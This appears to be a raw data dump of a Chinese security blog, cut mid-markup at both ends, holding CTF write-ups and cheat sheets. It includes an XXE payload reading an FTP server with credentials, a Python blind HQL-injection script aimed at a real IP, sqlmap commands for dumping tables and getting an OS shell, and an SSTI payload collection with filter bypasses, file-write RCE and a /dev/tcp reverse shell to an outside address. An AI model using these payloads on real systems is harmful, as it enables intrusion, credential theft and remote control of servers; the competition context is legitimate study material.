class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note [</span><br><span class=\"line\">&lt;!ENTITY file SYSTEM &quot;ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.4:21/&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;plans&gt;</span><br><span class=\"line\">    &lt;plan&gt;</span><br><span class=\"line\">        &lt;content&gt;&amp;file;&lt;/content&gt;</span><br><span class=\"line\">    &lt;/plan&gt;</span><br><span class=\"line\">&lt;/plans&gt;</span><br></pre></td></tr></table></figure>\n<p>结果:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2 minutes ago -rw-r--r-- 1 0 0 38 Jun 17 14:04 flag327a6c4304ad5938eaf0efb6cc3e53dc</span><br></pre></td></tr></table></figure>\n<h3 id=\"xxe读取172-18-0-4-21-flag327a6c4304ad5938eaf0efb6cc3e53dc\"><a href=\"#xxe读取172-18-0-4-21-flag327a6c4304ad5938eaf0efb6cc3e53dc\" class=\"headerlink\" title=\"xxe读取172.18.0.4:21/flag327a6c4304ad5938eaf0efb6cc3e53dc\"></a>xxe读取172.18.0.4:21/flag327a6c4304ad5938eaf0efb6cc3e53dc</h3><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?</span>xml version=<span class=\"string\">\"1.0\"</span> encoding=<span class=\"string\">\"UTF-8\"</span><span class=\"meta\">?&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note [</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!ENTITY file SYSTEM \"ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.4:21/flag327a6c4304ad5938eaf0efb6cc3e53dc\"&gt;</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">plans</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">plan</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">content</span>&gt;</span>&amp;file;<span class=\"tag\">&lt;/<span class=\"name\">content</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">plan</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">plans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>结果:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">20 minutes ago sctf&#123;Not_0n1y_xx3_but_als0_web_cache&#125;</span><br></pre></td></tr></table></figure>\n<p>##Zhuanxv</p>\n<h3 id=\"主要代码片段\"><a href=\"#主要代码片段\" class=\"headerlink\" title=\"主要代码片段\"></a>主要代码片段</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//UserLoginAction.class</span><br><span class=\"line\">public boolean userCheck(User user) &#123;</span><br><span class=\"line\">    List &lt; User &gt; userList = this.userService.loginCheck(user.getName(), user.getPassword());</span><br><span class=\"line\">    if ((userList != null) &amp;&amp; (userList.size() == 1)) &#123;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    addActionError(&quot;Username or password is Wrong, please check!&quot;);</span><br><span class=\"line\">    return false;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//UserServiceImpl.class</span><br><span class=\"line\">public List &lt;User&gt; loginCheck(String name, String password) &#123;</span><br><span class=\"line\">    name = name.replaceAll(&quot; &quot;, &quot;&quot;);</span><br><span class=\"line\">    name = name.replaceAll(&quot;=&quot;, &quot;&quot;);</span><br><span class=\"line\">    Matcher username_matcher = Pattern.compile(&quot;^[0-9a-zA-Z]+$&quot;).matcher(name);</span><br><span class=\"line\">    Matcher password_matcher = Pattern.compile(&quot;^[0-9a-zA-Z]+$&quot;).matcher(password);</span><br><span class=\"line\">    if (password_matcher.find()) &#123;</span><br><span class=\"line\">        return this.userDao.loginCheck(name, password);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return null;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//UserDaoImpl.class</span><br><span class=\"line\">public List &lt;User&gt; loginCheck(String name, String password) &#123;</span><br><span class=\"line\">    return getHibernateTemplate().find(&quot;from User where name =&apos;&quot; + name + &quot;&apos; and password = &apos;&quot; + password + &quot;&apos;&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"payload\"><a href=\"#payload\" class=\"headerlink\" title=\"payload\"></a>payload</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">s=requests.session()</span><br><span class=\"line\"></span><br><span class=\"line\"># 漏洞语句 hql</span><br><span class=\"line\"># from User where name = &apos;&quot; + name + &quot;&apos; and password = &apos;&quot; + password + &quot;&apos;&quot;</span><br><span class=\"line\"># </span><br><span class=\"line\"># 更简单的payload</span><br><span class=\"line\"># user.name=1&apos;or(from%0aFlag)like&apos;sctf&#123;%25&apos;or&apos;&apos;like&apos;&amp;user.password=asdf</span><br><span class=\"line\">flag=&apos;&apos;</span><br><span class=\"line\">for i in range(1,50):</span><br><span class=\"line\">    p=&apos;&apos;</span><br><span class=\"line\">    for j in range(1,255):</span><br><span class=\"line\">        # 注意空格需要替换为换行(%0a)或者(%09)W，这是因为代码中将空格替换为&quot;&quot;</span><br><span class=\"line\">        payload=&quot;(select%0aascii(substr(id,&quot;+str(i)+&quot;,1))%0afrom%0aFlag%0awhere%0aid&lt;2)&lt;&apos;&quot;+str(j)+&quot;&apos;&quot;</span><br><span class=\"line\">        #print payload</span><br><span class=\"line\">        url=&quot;http://121.196.195.244:9032/zhuanxvlogin?user.name=admin&apos;or%0a&quot;+payload+&quot;%0aor%0aname%0alike%0a&apos;admin&amp;user.password=1&quot;</span><br><span class=\"line\">        print url</span><br><span class=\"line\">        r1=s.get(url)</span><br><span class=\"line\">        #print url</span><br><span class=\"line\">        #print len(r1.text)</span><br><span class=\"line\">        if len(r1.text)&gt;20000 and p!=&apos;&apos;:</span><br><span class=\"line\">            flag+=p</span><br><span class=\"line\">            print i,flag</span><br><span class=\"line\">            break</span><br><span class=\"line\">        p=chr(j)</span><br><span class=\"line\"></span><br><span class=\"line\"># http://121.196.195.244:9032/zhuanxvlogin?user.name=admin&apos;or%0a(select%0Aascii(substr(id,1,1))%0Afrom%0AFlag%0Awhere%0Aid&lt;2)&lt;&apos;116&apos;%0aor%0aname%0alike%0a&apos;admin&amp;user.password=1</span><br><span class=\"line\"># user.name=1&apos;or(from%0aFlag)like&apos;sctf&#123;%25&apos;or&apos;&apos;like&apos;&amp;user.password=aaaa</span><br></pre></td></tr></table></figure>\n<h2 id=\"BabySyc-Simple-PHP-Web\"><a href=\"#BabySyc-Simple-PHP-Web\" class=\"headerlink\" title=\"BabySyc - Simple PHP Web\"></a>BabySyc - Simple PHP Web</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"sqlmap使用","date":"2018-06-08T01:45:39.000Z","_content":"\n# sqlmap使用手册\n\nsqlmap一共5个级别，级别越高，检测越全面\n\n1. 检测\n\n   默认使用level1，检测全部数据库类型\n\n   >  sqlmap -u “http://www.vuln.cn/post.php?id=1”\n\n2. 只检测mysql\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3\n\n3. 检测cookie(（只有level达到2才会检测cookie）)\n\n   >  sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11” –level 2\n\n4. post注入\n\n   request.txt: 首先需要抓包，然后将数据包保存到requests.txt\n\n   > sqlmap -r “c:\\tools\\request.txt” -p “username” –dbms mysql    \n   >\n   > 指定username参数\n\n   或者:\n\n   > python sqlmap.py -u \"http://www.target.com/vuln.php\" --data=\"id=1\" -f --dbs\n\n5. 查询有哪些数据库\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –-dbms mysql -–level 3 –-dbs\n\n6. 查询有哪些表(以test数据库为例)\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –-dbms mysql –-level 3 -D test -–tables\n\n7. 查询字段(以test数据库下的admin表为例)\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –-dbms mysql –-level 3 -D test -T admin –-columns\n\n8. 查询数据(以test数据库下的admin表为例)\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  -–dbms mysql –-level 3 -D test -T admin -C “username,password” –-dump\n\n9. 使用shell命令\n\n   > sqlmap -r “c:\\tools\\request.txt” -p id –-dbms mysql –-os-shell\n\n10. 使用tamper\n\n    >  sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3 --tamper unmagicquotes --dbs --hex\n\n11. 保存进度\n\n    > sqlmap -u “http://url/news?id=1“ –-dbs-o “sqlmap.log” 保存进度\n    >\n    > sqlmap -u “http://url/news?id=1“ -–dbs-o “sqlmap.log” –resume 恢复已保存进度\n\n    ","source":"_posts/sqlmap使用.md","raw":"---\ntitle: sqlmap使用\ndate: 2018-06-08 09:45:39\ntags: web安全\n---\n\n# sqlmap使用手册\n\nsqlmap一共5个级别，级别越高，检测越全面\n\n1. 检测\n\n   默认使用level1，检测全部数据库类型\n\n   >  sqlmap -u “http://www.vuln.cn/post.php?id=1”\n\n2. 只检测mysql\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3\n\n3. 检测cookie(（只有level达到2才会检测cookie）)\n\n   >  sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11” –level 2\n\n4. post注入\n\n   request.txt: 首先需要抓包，然后将数据包保存到requests.txt\n\n   > sqlmap -r “c:\\tools\\request.txt” -p “username” –dbms mysql    \n   >\n   > 指定username参数\n\n   或者:\n\n   > python sqlmap.py -u \"http://www.target.com/vuln.php\" --data=\"id=1\" -f --dbs\n\n5. 查询有哪些数据库\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –-dbms mysql -–level 3 –-dbs\n\n6. 查询有哪些表(以test数据库为例)\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –-dbms mysql –-level 3 -D test -–tables\n\n7. 查询字段(以test数据库下的admin表为例)\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  –-dbms mysql –-level 3 -D test -T admin –-columns\n\n8. 查询数据(以test数据库下的admin表为例)\n\n   > sqlmap -u “http://www.vuln.cn/post.php?id=1”  -–dbms mysql –-level 3 -D test -T admin -C “username,password” –-dump\n\n9. 使用shell命令\n\n   > sqlmap -r “c:\\tools\\request.txt” -p id –-dbms mysql –-os-shell\n\n10. 使用tamper\n\n    >  sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3 --tamper unmagicquotes --dbs --hex\n\n11. 保存进度\n\n    > sqlmap -u “http://url/news?id=1“ –-dbs-o “sqlmap.log” 保存进度\n    >\n    > sqlmap -u “http://url/news?id=1“ -–dbs-o “sqlmap.log” –resume 恢复已保存进度\n\n    ","slug":"sqlmap使用","published":1,"updated":"2018-06-25T12:00:14.781Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12i7001gqkdl6yhw6egd","content":"<h1 id=\"sqlmap使用手册\"><a href=\"#sqlmap使用手册\" class=\"headerlink\" title=\"sqlmap使用手册\"></a>sqlmap使用手册</h1><p>sqlmap一共5个级别，级别越高，检测越全面</p>\n<ol>\n<li><p>检测</p>\n<p>默认使用level1，检测全部数据库类型</p>\n<blockquote>\n<p> sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a></p>\n</blockquote>\n</li>\n<li><p>只检测mysql</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3</p>\n</blockquote>\n</li>\n<li><p>检测cookie(（只有level达到2才会检测cookie）)</p>\n<blockquote>\n<p> sqlmap -u “<a href=\"http://www.baidu.com/shownews.asp”\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com/shownews.asp”</a> –cookie “id=11” –level 2</p>\n</blockquote>\n</li>\n<li><p>post注入</p>\n<p>request.txt: 首先需要抓包，然后将数据包保存到requests.txt</p>\n<blockquote>\n<p>sqlmap -r “c:\\tools\\request.txt” -p “username” –dbms mysql    </p>\n<p>指定username参数</p>\n</blockquote>\n<p>或者:</p>\n<blockquote>\n<p>python sqlmap.py -u “<a href=\"http://www.target.com/vuln.php&quot;\" target=\"_blank\" rel=\"noopener\">http://www.target.com/vuln.php&quot;</a> –data=”id=1” -f –dbs</p>\n</blockquote>\n</li>\n<li><p>查询有哪些数据库</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  –-dbms mysql -–level 3 –-dbs</p>\n</blockquote>\n</li>\n<li><p>查询有哪些表(以test数据库为例)</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  –-dbms mysql –-level 3 -D test -–tables</p>\n</blockquote>\n</li>\n<li><p>查询字段(以test数据库下的admin表为例)</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  –-dbms mysql –-level 3 -D test -T admin –-columns</p>\n</blockquote>\n</li>\n<li><p>查询数据(以test数据库下的admin表为例)</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  -–dbms mysql –-level 3 -D test -T admin -C “username,password” –-dump</p>\n</blockquote>\n</li>\n<li><p>使用shell命令</p>\n<blockquote>\n<p>sqlmap -r “c:\\tools\\request.txt” -p id –-dbms mysql –-os-shell</p>\n</blockquote>\n</li>\n<li><p>使用tamper</p>\n<blockquote>\n<p> sqlmap.py -u <a href=\"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3\" target=\"_blank\" rel=\"noopener\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</a> –tamper unmagicquotes –dbs –hex</p>\n</blockquote>\n</li>\n<li><p>保存进度</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://url/news?id=1“\" target=\"_blank\" rel=\"noopener\">http://url/news?id=1“</a> –-dbs-o “sqlmap.log” 保存进度</p>\n<p>sqlmap -u “<a href=\"http://url/news?id=1“\" target=\"_blank\" rel=\"noopener\">http://url/news?id=1“</a> -–dbs-o “sqlmap.log” –resume 恢复已保存进度</p>\n</blockquote>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqlmap使用手册\"><a href=\"#sqlmap使用手册\" class=\"headerlink\" title=\"sqlmap使用手册\"></a>sqlmap使用手册</h1><p>sqlmap一共5个级别，级别越高，检测越全面</p>\n<ol>\n<li><p>检测</p>\n<p>默认使用level1，检测全部数据库类型</p>\n<blockquote>\n<p> sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a></p>\n</blockquote>\n</li>\n<li><p>只检测mysql</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3</p>\n</blockquote>\n</li>\n<li><p>检测cookie(（只有level达到2才会检测cookie）)</p>\n<blockquote>\n<p> sqlmap -u “<a href=\"http://www.baidu.com/shownews.asp”\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com/shownews.asp”</a> –cookie “id=11” –level 2</p>\n</blockquote>\n</li>\n<li><p>post注入</p>\n<p>request.txt: 首先需要抓包，然后将数据包保存到requests.txt</p>\n<blockquote>\n<p>sqlmap -r “c:\\tools\\request.txt” -p “username” –dbms mysql    </p>\n<p>指定username参数</p>\n</blockquote>\n<p>或者:</p>\n<blockquote>\n<p>python sqlmap.py -u “<a href=\"http://www.target.com/vuln.php&quot;\" target=\"_blank\" rel=\"noopener\">http://www.target.com/vuln.php&quot;</a> –data=”id=1” -f –dbs</p>\n</blockquote>\n</li>\n<li><p>查询有哪些数据库</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  –-dbms mysql -–level 3 –-dbs</p>\n</blockquote>\n</li>\n<li><p>查询有哪些表(以test数据库为例)</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  –-dbms mysql –-level 3 -D test -–tables</p>\n</blockquote>\n</li>\n<li><p>查询字段(以test数据库下的admin表为例)</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  –-dbms mysql –-level 3 -D test -T admin –-columns</p>\n</blockquote>\n</li>\n<li><p>查询数据(以test数据库下的admin表为例)</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://www.vuln.cn/post.php?id=1”\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/post.php?id=1”</a>  -–dbms mysql –-level 3 -D test -T admin -C “username,password” –-dump</p>\n</blockquote>\n</li>\n<li><p>使用shell命令</p>\n<blockquote>\n<p>sqlmap -r “c:\\tools\\request.txt” -p id –-dbms mysql –-os-shell</p>\n</blockquote>\n</li>\n<li><p>使用tamper</p>\n<blockquote>\n<p> sqlmap.py -u <a href=\"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3\" target=\"_blank\" rel=\"noopener\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</a> –tamper unmagicquotes –dbs –hex</p>\n</blockquote>\n</li>\n<li><p>保存进度</p>\n<blockquote>\n<p>sqlmap -u “<a href=\"http://url/news?id=1“\" target=\"_blank\" rel=\"noopener\">http://url/news?id=1“</a> –-dbs-o “sqlmap.log” 保存进度</p>\n<p>sqlmap -u “<a href=\"http://url/news?id=1“\" target=\"_blank\" rel=\"noopener\">http://url/news?id=1“</a> -–dbs-o “sqlmap.log” –resume 恢复已保存进度</p>\n</blockquote>\n</li>\n</ol>\n"},{"title":"ssti","date":"2018-07-17T07:09:17.000Z","_content":"\n## payload大全\n\n####  bypass 各种字符串\n\n1. 利用request.args\n\n```\n{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read\n```\n\n2. 利用字符串拼接\n\n```python\n{{request['__cla'+'ss__']['__m'+'ro__'][9]['__subcla'+'sses__']()[230]('''/bin/sh -c \n'l'''+'''s '''+chr(62)+'''& /dev/tcp/123.207.90.143/2333 0'''+chr(62)+'''&1 ''',shell=True)}}\n```\n\n3. 利用各种编码\n\n   > \"MTIzCg==\".decode(\"base64\")\n\n4. 利用attr\n\n```python\n{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_\n```\n\n```\n{{request|attr([\"_\"*2,\"class\",\"_\"*2]|join)}}\n{{request|attr([\"__\",\"class\",\"__\"]|join)}}\n{{request|attr(\"__class__\")}}\n{{request.__class__}}\n```\n\n#### bypass \"[\" 和 \"]\"\n\n1. 利用 attr\n\n```\n{{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_\n```\n\n2. 进阶版 利用.getlist\n\n```\n{{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_\n```\n\n#### bypassing \"|join\"\n\n1. 利用format\n\n```\n{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_\n```\n\n#### FinalRce:\n\n第一步:\n\n```\nhttp://localhost:5000/?exploit={%set a,b,c,d,e,f,g,h,i = request.__class__.__mro__%}{{i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&file=/tmp/foo.py&write=w&payload=print+1337\n```\n\n第二步:\n\n```\nhttp://localhost:5000/?exploit={%set a,b,c,d,e,f,g,h,i = request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%}{{(i|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&class=class&mro=mro&subc=subclasses&usc=_&file=/tmp/foo.py&write=w&payload=print+1337\n```\n\n#### Accessing parameters\n\nIn most examples we used request.args to access GET parameters, but there are other dictionaries that can be populated with custom values:\n\n* GET: request.args\n* Cookies: request.cookies\n* Headers: request.headers\n* Environment: request.environ\n* Values: request.values\n\nThe following notations can be used to access attributes of an object:\n\n* request.__class__\n* request[\"__class__\"]\n* request|attr(\"__class__\")\n\nElements of arrays can be accessed with:\n\n* array[0]\n* array.pop(0)\n\n#### import\n\n```python\n{% import module %} – Allows you to import python modules.\n\nExample: {% import subprocess %}\n\nThat’s all we need to craft an exploit code.\n\n{% import os %}{{ os.popen(\"whoami\").read() }}\n```\n\n\n\n","source":"_posts/ssti.md","raw":"---\ntitle: ssti\ndate: 2018-07-17 15:09:17\ntags:\n---\n\n## payload大全\n\n####  bypass 各种字符串\n\n1. 利用request.args\n\n```\n{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read\n```\n\n2. 利用字符串拼接\n\n```python\n{{request['__cla'+'ss__']['__m'+'ro__'][9]['__subcla'+'sses__']()[230]('''/bin/sh -c \n'l'''+'''s '''+chr(62)+'''& /dev/tcp/123.207.90.143/2333 0'''+chr(62)+'''&1 ''',shell=True)}}\n```\n\n3. 利用各种编码\n\n   > \"MTIzCg==\".decode(\"base64\")\n\n4. 利用attr\n\n```python\n{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_\n```\n\n```\n{{request|attr([\"_\"*2,\"class\",\"_\"*2]|join)}}\n{{request|attr([\"__\",\"class\",\"__\"]|join)}}\n{{request|attr(\"__class__\")}}\n{{request.__class__}}\n```\n\n#### bypass \"[\" 和 \"]\"\n\n1. 利用 attr\n\n```\n{{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_\n```\n\n2. 进阶版 利用.getlist\n\n```\n{{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_\n```\n\n#### bypassing \"|join\"\n\n1. 利用format\n\n```\n{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_\n```\n\n#### FinalRce:\n\n第一步:\n\n```\nhttp://localhost:5000/?exploit={%set a,b,c,d,e,f,g,h,i = request.__class__.__mro__%}{{i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&file=/tmp/foo.py&write=w&payload=print+1337\n```\n\n第二步:\n\n```\nhttp://localhost:5000/?exploit={%set a,b,c,d,e,f,g,h,i = request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%}{{(i|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&class=class&mro=mro&subc=subclasses&usc=_&file=/tmp/foo.py&write=w&payload=print+1337\n```\n\n#### Accessing parameters\n\nIn most examples we used request.args to access GET parameters, but there are other dictionaries that can be populated with custom values:\n\n* GET: request.args\n* Cookies: request.cookies\n* Headers: request.headers\n* Environment: request.environ\n* Values: request.values\n\nThe following notations can be used to access attributes of an object:\n\n* request.__class__\n* request[\"__class__\"]\n* request|attr(\"__class__\")\n\nElements of arrays can be accessed with:\n\n* array[0]\n* array.pop(0)\n\n#### import\n\n```python\n{% import module %} – Allows you to import python modules.\n\nExample: {% import subprocess %}\n\nThat’s all we need to craft an exploit code.\n\n{% import os %}{{ os.popen(\"whoami\").read() }}\n```\n\n\n\n","slug":"ssti","published":1,"updated":"2018-07-20T13:44:54.729Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12ia001iqkdl0i9e7e18","content":"<h2 id=\"payload大全\"><a href=\"#payload大全\" class=\"headerlink\" title=\"payload大全\"></a>payload大全</h2><h4 id=\"bypass-各种字符串\"><a href=\"#bypass-各种字符串\" class=\"headerlink\" title=\"bypass 各种字符串\"></a>bypass 各种字符串</h4><ol>\n<li>利用request.args</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&apos;&apos;[request.args.a][request.args.b][2][request.args.c]()[40](&apos;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&apos;)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>利用字符串拼接</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;request[<span class=\"string\">'__cla'</span>+<span class=\"string\">'ss__'</span>][<span class=\"string\">'__m'</span>+<span class=\"string\">'ro__'</span>][<span class=\"number\">9</span>][<span class=\"string\">'__subcla'</span>+<span class=\"string\">'sses__'</span>]()[<span class=\"number\">230</span>](<span class=\"string\">'''/bin/sh -c </span></span><br><span class=\"line\"><span class=\"string\">'l'''</span>+<span class=\"string\">'''s '''</span>+chr(<span class=\"number\">62</span>)+<span class=\"string\">'''&amp; /dev/tcp/123.207.90.143/2333 0'''</span>+chr(<span class=\"number\">62</span>)+<span class=\"string\">'''&amp;1 '''</span>,shell=<span class=\"keyword\">True</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li><p>利用各种编码</p>\n<blockquote>\n<p>“MTIzCg==”.decode(“base64”)</p>\n</blockquote>\n</li>\n<li><p>利用attr</p>\n</li>\n</ol>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span 